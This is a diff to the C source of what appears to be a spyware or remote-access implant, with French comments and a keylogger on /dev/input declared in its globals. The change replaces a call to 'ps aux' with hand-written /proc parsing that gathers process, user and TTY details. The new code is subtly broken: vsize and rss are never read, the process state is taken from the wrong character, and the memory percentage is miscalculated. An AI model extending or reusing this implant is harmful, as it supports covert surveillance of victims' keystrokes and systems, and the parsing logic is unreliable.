@@ -15,6 +15,8 @@
 #include <dirent.h>
 #include <linux/input.h> // Pour le keylogger
 #include <pthread.h>     // Pour les threads
+#include <pwd.h>         // Pour getpwuid
+#include <ctype.h>       // Ajout pour isdigit
 
 // Variables globales pour le keylogger
 static int keylogger_fd = -1;         // Descripteur de fichier pour /dev/input
@@ -109,9 +111,120 @@ char *read_file(const char *filepath) {
     return strdup(buffer);
 }
 
-// Fonction pour lister les processus (simulé avec `ps`)
+// Fonction pour lister les processus en lisant /proc
 char *list_processes() {
-    return execute_command("ps aux");
+    DIR *dir;
+    struct dirent *entry;
+    char buffer[8192] = {0};
+    size_t offset = 0;
+
+    // En-tête similaire à ps aux
+    offset += snprintf(buffer + offset, sizeof(buffer) - offset,
+                      "USER       PID %%CPU %%MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n");
+
+    dir = opendir("/proc");
+    if (!dir) {
+        return strdup("Erreur : impossible d'ouvrir /proc");
+    }
+
+    while ((entry = readdir(dir)) != NULL) {
+        // Vérifie si l'entrée est un PID (numérique)
+        if (!isdigit(*entry->d_name)) {
+            continue;
+        }
+
+        char path[PATH_MAX];
+        char line[1024];
+        FILE *fp;
+        pid_t pid = atoi(entry->d_name);
+        char comm[256] = {0};
+        char state = ' ';
+        long utime = 0, stime = 0;
+        unsigned long vsize = 0, rss = 0;
+        char tty[32] = "?";
+        char start[16] = "00:00";
+        char user[32] = "unknown";
+
+        // Lecture du fichier stat
+        snprintf(path, sizeof(path), "/proc/%s/stat", entry->d_name);
+        fp = fopen(path, "r");
+        if (fp) {
+            if (fgets(line, sizeof(line), fp)) {
+                char *p = line;
+                int field = 0;
+                while (field < 23 && p) {
+                    if (field == 2) state = p[1];  // État du processus
+                    if (field == 13) utime = atol(p);  // Temps utilisateur
+                    if (field == 14) stime = atol(p);  // Temps système
+                    if (field == 23) vsize = atol(p);  // Taille virtuelle
+                    if (field == 24) rss = atol(p);    // Mémoire résidente
+                    p = strchr(p, ' ');
+                    if (p) p++;
+                    field++;
+                }
+            }
+            fclose(fp);
+        }
+
+        // Lecture du nom de la commande
+        snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);
+        fp = fopen(path, "r");
+        if (fp) {
+            fgets(comm, sizeof(comm), fp);
+            comm[strcspn(comm, "\n")] = 0;  // Supprime le retour à la ligne
+            fclose(fp);
+        }
+
+        // Obtention du TTY
+        snprintf(path, sizeof(path), "/proc/%s/stat", entry->d_name);
+        fp = fopen(path, "r");
+        if (fp) {
+            if (fgets(line, sizeof(line), fp)) {
+                int tty_nr;
+                sscanf(line, "%*d %*s %*c %*d %*d %*d %d", &tty_nr);
+                if (tty_nr != 0) {
+                    snprintf(tty, sizeof(tty), "tty%d", tty_nr);
+                }
+            }
+            fclose(fp);
+        }
+
+        // Obtention de l'utilisateur
+        struct stat statbuf;
+        snprintf(path, sizeof(path), "/proc/%s", entry->d_name);
+        if (stat(path, &statbuf) == 0) {
+            struct passwd *pw = getpwuid(statbuf.st_uid);
+            if (pw) {
+                strncpy(user, pw->pw_name, sizeof(user) - 1);
+                user[sizeof(user) - 1] = '\0';
+            }
+        }
+
+        // Calcul du temps CPU (approximation)
+        long total_time = (utime + stime) / sysconf(_SC_CLK_TCK);
+        long minutes = total_time / 60;
+        long seconds = total_time % 60;
+        char time_str[32];  // Augmenté de 16 à 32 pour éviter la troncature
+        snprintf(time_str, sizeof(time_str), "%ld:%02ld", minutes, seconds);
+
+        // Approximation %CPU et %MEM (simplifiée)
+        float cpu_percent = 0.0;  // À améliorer avec des données système globales
+        float mem_percent = (rss * sysconf(_SC_PAGESIZE)) / (float)sysconf(_SC_PHYS_PAGES) * 100;
+
+        // Ajout de la ligne au buffer
+        offset += snprintf(buffer + offset, sizeof(buffer) - offset,
+                          "%-8s %5d %4.1f %4.1f %6lu %5lu %-7s %c    %5s %7s %s\n",
+                          user, pid, cpu_percent, mem_percent, vsize, rss, tty,
+                          state, start, time_str, comm);
+
+        if (offset >= sizeof(buffer) - 256) {
+            break;  // Prévenir débordement
+        }
+    }
+
+    closedir(dir);
+    clean_string(buffer);
+    return strdup(buffer);
 }
 
 // Fonction pour lister les sockets ouverts
